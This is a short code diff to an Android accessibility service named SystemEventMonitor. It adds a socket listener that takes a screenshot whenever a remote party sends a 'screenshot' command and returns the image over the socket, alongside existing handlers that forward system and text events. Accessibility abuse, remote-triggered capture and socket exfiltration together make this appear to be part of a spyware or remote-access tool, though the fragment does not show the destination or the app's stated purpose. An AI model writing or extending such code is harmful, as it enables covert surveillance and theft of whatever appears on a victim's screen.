@@ -60,10 +60,20 @@ public class SystemEventMonitor extends AccessibilityService {
             this.socketManager = new SocketManager(this, configManager);
             
             // Create screenshot handler first
-            this.screenShotEventHandler = new ScreenshotEventHandler(this, socketManager, configManager);
+            this.screenShotEventHandler = new ScreenshotEventHandler(this, configManager);
             
             // Create text handler with screenshot handler reference
             this.systemEventHandler = new SystemEventHandler(screenShotEventHandler, socketManager);
+            
+            // Add listener for manual screenshot requests
+            this.socketManager.addListener("screenshot", args -> {
+                // Capture screenshot and send as response
+                screenShotEventHandler.takeScreenshot().thenAccept(imageBytes -> {
+                    if (imageBytes != null) {
+                        socketManager.sendEvent("screenshot_response", imageBytes);
+                    }
+                });
+            });
             
             this.isInitialized = true;
             
